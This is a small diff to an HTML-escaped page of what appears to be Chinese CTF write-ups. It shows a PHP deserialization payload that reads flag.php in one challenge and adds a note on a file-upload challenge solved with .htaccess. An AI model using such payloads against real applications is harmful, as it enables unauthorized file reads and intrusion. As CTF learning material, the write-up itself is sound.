@@ -746,7 +746,8 @@ php 强类型比较，如果为字符串类型的 2 就会让 op=1, 之后执行
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?str=O:11:&amp;quot;FileHandler&amp;quot;:3:&amp;#123;s:2:&amp;quot;op&amp;quot;;i:2;s:8:&amp;quot;filename&amp;quot;;s:8:&amp;quot;flag.php&amp;quot;;s:7:&amp;quot;content&amp;quot;;N;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 &lt;p&gt;f12 在注释成功拿取 flag&lt;/p&gt;
 &lt;h2&gt;&lt;span id=&#34;gxyctf2019babyupload&#34;&gt; [GXYCTF2019]BabyUpload&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;点进去 Github 看到 exp 中有.htaccess&lt;/p&gt;
+&lt;p&gt;文件上传漏洞&lt;br&gt;
+点进去 Github 看到 exp 中有.htaccess&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;,htaccess&lt;/li&gt;
 &lt;/ol&gt;
